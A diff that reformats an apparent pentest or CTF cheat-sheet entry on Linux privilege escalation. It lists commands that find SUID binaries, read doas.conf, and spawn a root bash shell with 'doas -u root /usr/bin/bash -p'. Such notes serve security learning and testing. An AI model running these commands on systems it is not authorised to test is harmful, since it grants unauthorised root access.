@@ -6,10 +6,18 @@
 
 ## STEPS
 
- - find / -type f -perm 4000 2>/dev/null (Check for unusual SUID binaries)
+#### 1) Check for unusual SUID binaries
 
- - find / -type f -name "doas.conf" 2>/dev/null (Search for the doas configuration file)
+    find / -type f -perm 4000 2>/dev/null
 
- - cat /path/to/doas.conf (Check which binary can be run using doas with elevated privileges)
+#### 2) Search for the doas configuration file
 
- - doas -u root /usr/bin/bash -p (Runs bash using doas as root)
+    find / -type f -name "doas.conf" 2>/dev/null 
+
+#### 3) Check which binary can be run using doas with elevated privileges
+
+    cat /path/to/doas.conf 
+
+#### 4) Runs bash using doas as root
+
+    doas -u root /usr/bin/bash -p 
